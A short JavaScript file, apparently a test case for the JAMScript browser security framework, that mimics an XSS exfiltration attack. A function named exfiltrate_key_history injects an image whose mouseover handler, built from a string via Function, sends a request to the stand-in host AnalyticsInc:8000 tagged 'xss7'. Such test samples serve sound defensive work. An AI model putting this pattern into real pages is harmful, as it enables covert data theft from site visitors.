function exfiltrate_key_history() {
  var script = document.createElement("img");
  script.src = "#";
  var v0 = script;
  var v4 = JAMScript.call(Function, null, ['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss7",true);xmlhttp.send(null);']);
  JAMScript.set(v0, "onmouseover", v4);
  script.height = "50";
  script.width = "50";
  script.alt = "image";
  var v3 = document.getElementsByTagName("body");
  var v1 = v3[0];
  JAMScript.call(v1.appendChild, v1, [script]);
  return
}
var v2 = document.getElementById("test");
JAMScript.set(v2, "onclick", exfiltrate_key_history);

